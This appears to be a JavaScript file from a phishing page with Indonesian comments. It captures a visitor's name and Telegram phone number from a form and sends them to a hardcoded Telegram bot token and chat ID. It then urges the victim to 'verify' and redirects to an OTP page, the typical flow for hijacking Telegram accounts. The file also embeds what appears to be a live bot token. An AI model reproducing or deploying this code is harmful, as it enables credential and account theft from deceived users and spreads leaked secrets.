
document.getElementById('contactForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Mencegah pengiriman formulir default

    const name = document.getElementById('name').value;
    const telegram= document.getElementById('telegram').value;
    
   const token = '7648378330:AAEAq0udVYtsHePwOsFOcpRVYSl1Ivnm5uI'; // Ganti dengan token bot Anda
    const chatId = '6387471971'; // Ganti dengan ID chat Anda
    
    const text = `Nama: ${name}\nNomor: ${telegram}`;
    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
    function gabungkanFungsi() {
        fetch(url)
            .then(response => {
                if (response.ok) {
                    alert('silahkan KLIK SELANJUTNYA untuk verifikasi Nomor anda');
                    document.getElementById('contactForm').reset(); // Reset formulir
                    window.location.href = "OTP.html"; // Arahkan ke halaman otp.html
                } else {
                    alert('Terjadi kesalahan saat mengirim kode.');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Terjadi kesalahan saat mengirim pesan.');
            });
    }

    // Panggil fungsi gabungan
    gabungkanFungsi();
});
